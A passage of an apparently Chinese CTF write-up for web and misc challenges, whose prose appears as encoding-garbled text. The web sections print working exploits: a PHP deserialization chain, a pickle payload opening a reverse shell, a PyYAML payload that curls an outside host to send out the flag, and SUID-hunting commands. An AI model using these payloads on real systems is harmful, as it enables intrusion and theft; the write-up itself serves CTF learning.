class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = True;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheng</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$finish</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;name[<span class="hljs-variable">$value</span>];<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bei</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;CTF-&gt;<span class="hljs-title function_ invoke__">ycb</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;fine-&gt;<span class="hljs-title function_ invoke__">YCB1</span>(<span class="hljs-variable">$this</span>-&gt;rce, <span class="hljs-variable">$this</span>-&gt;rce1);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prohib</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;CTF&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">prohib</span>(<span class="hljs-variable">$a</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¸€ä¸ªphpååºåˆ—åŒ–ï¼Œä»hintä¸­å¾—çŸ¥flagä½ç½®ä¸åœ¨æ ¹ç›®å½•ï¼Œæ‰€ä»¥<code>Pro</code>ç±»å¯ä»¥èˆå¼ƒ<br>å‘ç°æ•æ„Ÿå‡½æ•°<code>call_user_func</code>ï¼Œæ‰€ä»¥æœ€ç»ˆåº”è¯¥è¦è°ƒç”¨<code>__call</code>ï¼Œè€Œåœ¨<code>Bei</code>ä¸­<code>__destruct()</code>å­˜åœ¨å‡½æ•°è°ƒç”¨ï¼Œpocå¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bei</span>();<br><br><span class="hljs-variable">$a</span> -&gt; CTF = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$a</span> -&gt; CTF -&gt; finish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cheng</span>();<br><span class="hljs-variable">$a</span> -&gt; CTF -&gt; finish -&gt; name = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;finish&quot;</span>=&gt;<span class="hljs-literal">true</span>);<br><br><br><span class="hljs-variable">$a</span> -&gt; fine = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yang</span>();<br><span class="hljs-variable">$a</span> -&gt; rce = <span class="hljs-string">&quot;/tmp/catcatf1ag.txt&quot;</span>;<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; finish = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cheng</span>();<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; finish -&gt; name = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;finish&quot;</span>=&gt;<span class="hljs-literal">true</span>);<br><span class="hljs-variable">$a</span> -&gt; fine -&gt; now = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;YCB1&quot;</span>=&gt;<span class="hljs-string">&quot;highlight_file&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>

<p><code>O%3A3%3A%22Bei%22%3A3%3A%7Bs%3A3%3A%22CTF%22%3BO%3A4%3A%22Yang%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7Ds%3A4%3A%22fine%22%3BO%3A4%3A%22Yang%22%3A2%3A%7Bs%3A6%3A%22finish%22%3BO%3A5%3A%22Cheng%22%3A2%3A%7Bs%3A13%3A%22%00Cheng%00finish%22%3BN%3Bs%3A4%3A%22name%22%3Ba%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7Ds%3A3%3A%22now%22%3Ba%3A1%3A%7Bs%3A4%3A%22YCB1%22%3Bs%3A14%3A%22highlight_file%22%3B%7D%7Ds%3A3%3A%22rce%22%3Bs%3A19%3A%22%2Ftmp%2Fcatcatf1ag.txt%22%3B%7D</code></p>
<p>æœ€åé‚£ä¸ªè¿‡æ»¤ç”¨<code>highlight_file</code>å‡½æ•°æˆ–è€…åŒå†™éƒ½å¯ä»¥ç»•è¿‡</p>
<p><img src="/img/wp/2023/2023ycb-2.png"></p>
<h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><p><a href="http://www.zipä¸‹è½½æºç /">www.zipä¸‹è½½æºç </a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> secret<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/verification&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verification</span>():<br>    <span class="hljs-keyword">try</span>:<br>        attribute = session.get(<span class="hljs-string">&#x27;Attribute&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(attribute, <span class="hljs-built_in">dict</span>):<br>            <span class="hljs-keyword">raise</span> Exception<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hacker!!!&#x27;</span><br>    <span class="hljs-keyword">if</span> attribute.get(<span class="hljs-string">&#x27;name&#x27;</span>) == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">if</span> attribute.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> secret<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Don&#x27;t play tricks on me&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are a perfect stranger to me&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure>

<p>è®¿é—®<code>/verification</code>ï¼Œè¿›è¡Œsessionä¼ªé€ ï¼Œå¾—åˆ°<code>Hello admin, welcome to /ppppppppppick1e</code></p>
<p><img src="/img/wp/2023/2023ycb-3.png"></p>
<p>è®¿é—®<code>/ppppppppppick1e</code>ï¼Œå¾—åˆ°<code>Hint: Source in /src0de</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src0de&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src0de</span>():<br>    f = <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    rsp = f.read()<br>    f.close()<br>    <span class="hljs-keyword">return</span> rsp[rsp.index(<span class="hljs-string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppppppppppick1e</span>():<br>    <span class="hljs-keyword">try</span>:<br>        username = <span class="hljs-string">&quot;admin&quot;</span><br>        rsp = make_response(<span class="hljs-string">&quot;Hello, %s &quot;</span> % username)<br>        rsp.headers[<span class="hljs-string">&#x27;hint&#x27;</span>] = <span class="hljs-string">&quot;Source in /src0de&quot;</span><br>        pick1e = request.cookies.get(<span class="hljs-string">&#x27;pick1e&#x27;</span>)<br>        <span class="hljs-keyword">if</span> pick1e <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            pick1e = base64.b64decode(pick1e)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> rsp<br>        <span class="hljs-keyword">if</span> check(pick1e):<br>            pick1e = pickle.loads(pick1e)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Go for it!!!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Way!!!&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        error_message = <span class="hljs-built_in">str</span>(e)<br>        <span class="hljs-keyword">return</span> error_message<br><br>    <span class="hljs-keyword">return</span> rsp<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GWHT</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure>

<p>pickleååºåˆ—åŒ–rce</p>
<p>åå¼¹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>payload= <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ip&quot;,port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(base64.b64encode(payload))<br></code></pre></td></tr></table></figure>

<p>å‘ç°æ²¡æœ‰æƒé™</p>
<p><img src="/img/wp/2023/2023ycb-4.png"></p>
<p>æŸ¥æ‰¾æœ‰æƒé™çš„å‘½ä»¤</p>
<p><code>find /bin/ -perm 777</code>æˆ–è€…<code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p>å‘ç°python3æœ‰æƒé™ï¼Œä½¿ç”¨python3è¯»flag<br><code>python3 -c &#39;print(open(&quot;/flag&quot;).read())&#39;</code></p>
<p><img src="/img/wp/2023/2023ycb-5.png"></p>
<h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> *<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] =<span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>)+<span class="hljs-string">&quot;Boogipopisweak&quot;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name=request.args.get(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>)<br>    m1sery=[request.args.get(<span class="hljs-string">&quot;m1sery&quot;</span>,<span class="hljs-string">&quot;Doctor.Boogipop&quot;</span>)]<br>    <span class="hljs-keyword">if</span>(session.get(<span class="hljs-string">&quot;name&quot;</span>)==<span class="hljs-string">&quot;Dr.Boog1pop&quot;</span>):<br>        blacklist=re.findall(<span class="hljs-string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker no way&quot;</span><br>        <span class="hljs-built_in">exec</span>(<span class="hljs-string">f&#x27;for [<span class="hljs-subst">&#123;name&#125;</span>] in [<span class="hljs-subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&quot;Doctor&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>,name=session.get(<span class="hljs-string">&quot;name&quot;</span>))<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>        file = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>        fileblacklist=re.findall(<span class="hljs-string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> fileblacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad hacker!&quot;</span><br>        start=request.args.get(<span class="hljs-string">&quot;start&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        end=request.args.get(<span class="hljs-string">&quot;end&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        <span class="hljs-keyword">if</span> start==<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-keyword">and</span> end==<span class="hljs-string">&quot;0&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>        <span class="hljs-keyword">else</span>:<br>            start,end=<span class="hljs-built_in">int</span>(start),<span class="hljs-built_in">int</span>(end)<br>            f=<span class="hljs-built_in">open</span>(file,<span class="hljs-string">&quot;rb&quot;</span>)<br>            f.seek(start)<br>            data=f.read(end)<br>            <span class="hljs-keyword">return</span> data<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">render_page</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-built_in">print</span>(os.path.pardir)<br>    <span class="hljs-built_in">print</span>(path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&quot;templates/&quot;</span> + path):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not found&quot;</span>, <span class="hljs-number">404</span><br>    <span class="hljs-keyword">return</span> render_template(path)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<br>        debug=<span class="hljs-literal">False</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br>    <span class="hljs-built_in">print</span>(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br></code></pre></td></tr></table></figure>

<p>æœ‰ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼Œéé¢„æœŸè§£å°±ç›´æ¥è¯»ç¯å¢ƒå˜é‡äº†</p>
<p><img src="/img/wp/2023/2023ycb-6.png"></p>
<h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    flag = <span class="hljs-literal">True</span><br>    blacklist = [<span class="hljs-string">&#x27;bytes&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;frozenset&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;tuple&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;object&#x27;</span>,<span class="hljs-string">&#x27;listitems&#x27;</span>,<span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;object&#x27;</span>,<span class="hljs-string">&#x27;apply&#x27;</span>]<br>    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(s).lower():<br>            flag= <span class="hljs-literal">False</span><br>            <span class="hljs-built_in">print</span>(no)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extractFile</span>(<span class="hljs-params">filepath, <span class="hljs-built_in">type</span></span>):<br><br>    extractdir = filepath.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(extractdir):<br>        os.makedirs(extractdir)<br><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;tar&#x27;</span>:<br>        tf = tarfile.TarFile(filepath)<br>        tf.extractall(extractdir)<br>        <span class="hljs-keyword">return</span> tf.getnames()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>        fn = <span class="hljs-string">&#x27;uploads/&#x27;</span> + md5().hexdigest()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fn):<br>            os.makedirs(fn)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        upFile = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-built_in">print</span>(upFile)<br>        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span><br><br>        savePath = <span class="hljs-string">f&quot;uploads/<span class="hljs-subst">&#123;upFile.filename&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(savePath)<br>        upFile.save(savePath)<br><br>        <span class="hljs-keyword">if</span> tarfile.is_tarfile(savePath):<br>            zipDatas = extractFile(savePath, <span class="hljs-string">&#x27;tar&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">if</span> request.args:<br>        username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;config/<span class="hljs-subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            Config = yaml.load(f.read())<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, username=<span class="hljs-string">&quot;admin&quot;</span>, message=<span class="hljs-string">&quot;success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure>

<p>&#x2F;uploadè·¯ç”±ä¸­ä¸Šä¼ taræ–‡ä»¶ï¼Œç„¶åé€šè¿‡&#x2F;srcè·¯ç”±è¿›è¡Œyamlè§£æï¼Œå­˜åœ¨PyYAMLååºåˆ—åŒ–æ¼æ´</p>
<p>poc</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/apply:os.system</span> [<span class="hljs-string">&quot;curl http://ip:7777/?flag=`cat /fl*|base64`&quot;</span>]<br></code></pre></td></tr></table></figure>

<p>åˆ¶ä½œtaråŒ…<br><code>tar cPvf test.tar ../../config/config.yaml</code></p>
<p>ä¸Šä¼ åè®¿é—®<code>/src?username=config</code>è§¦å‘</p>
<p><img src="/img/wp/2023/2023ycb-7.png"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="aiå’Œniaçš„äº¤å“æ›²"><a href="#aiå’Œniaçš„äº¤å“æ›²" class="headerlink" title="aiå’Œniaçš„äº¤å“æ›²"></a>aiå’Œniaçš„äº¤å“æ›²</h2><p>upload.phpä¸­ä¸Šä¼ äº†ä¸€ä¸ªflag1.png</p>
<p>å…¶ä¸­æ¯æ¡é»‘çº¿åˆ°ä¸‹æ¡é»‘çº¿æ°å¥½8bitï¼ŒæŠŠé»‘è‰²å½“æˆ0ï¼Œç™½è‰²å½“æˆ1ï¼Œç«–ç€è¯»å–åè½¬å­—ç¬¦ä¸²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>)<br>width, height = img.size<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        pixel = img.getpixel((i, j))[<span class="hljs-number">0</span>]<br>        flag += <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">if</span> pixel &gt;= <span class="hljs-number">30</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;0&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;outs.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(flag)<br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">8</span>):<br>    byte = flag[i:i+<span class="hljs-number">8</span>]<br>    decimal = <span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>)<br>    result += <span class="hljs-built_in">chr</span>(decimal)<br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<p>ç»“å°¾å¾—åˆ°<code>HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_</code></p>
<p>httpæµä¸­è¿˜æœ‰ä¸€ä¸ªflag2.zipï¼Œå‘ç°æ˜¯ä¼ªåŠ å¯†</p>
<p>è§£å‹åçš„å†…å®¹å¦‚ä¸‹ï¼Œå…¶ä¸­è¿˜æœ‰0å®½ï¼Œä½†æ²¡ä»€ä¹ˆç”¨</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span>:<span class="hljs-number">04</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">22</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">04</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">22</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">10</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">13</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">09</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">01</span><br><span class="hljs-attribute">00</span>:<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure>

<p>åœ¨hintä¸­ç»™çš„è§†é¢‘åœ°å€å»æ‰¾å­—æ¯ï¼Œå¾—åˆ°<code>CAOCAOGAIFAN</code></p>
<p>ç»„åˆåä¸ºflagï¼š<code>@i_n1a_l0v3S_CAOCAOGAIFAN</code></p>
<h2 id="EZ-misc"><a href="#EZ-misc" class="headerlink" title="EZ_misc"></a>EZ_misc</h2><p>é«˜åº¦ä¸å¯¹ï¼Œå…ˆçˆ†ç ´å‡ºæ­£ç¡®çš„å®½é«˜</p>
<p>å‘ç°ä¸¤ä¸ªiendï¼ŒçŒœæµ‹æ˜¯snippingçš„CVE</p>
<p><img src="/img/wp/2023/2023ycb-8.png"></p>
<h2 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a>Matryoshka</h2><p>osfmountæŒ‚è½½ï¼Œæœ‰ä¸‰ä¸ªç›˜</p>
<p>åˆ†åˆ«æ‹¿åˆ°<code>encrypt</code>ï¼Œ<code>normal_rar.rar</code>ï¼Œ<code>not_real_cat.jpg</code></p>
<p>å…¶ä¸­rarå¯ä»¥åˆ†ç¦»å‡ºä¸€å¼ jpgï¼Œå¤§å°æ ·å¼ä¸å¦ä¸€å¼ jpgä¸€æ ·ï¼Œä½¿ç”¨åŒå›¾ç›²æ°´å°</p>
<p><img src="/img/wp/2023/2023ycb-9.png"></p>
<p>ä½¿ç”¨<code>veracrypt</code>æŒ‚è½½<code>encrypt</code>ï¼Œå¯†ç ä¸º<code>watermark_is_fun</code></p>
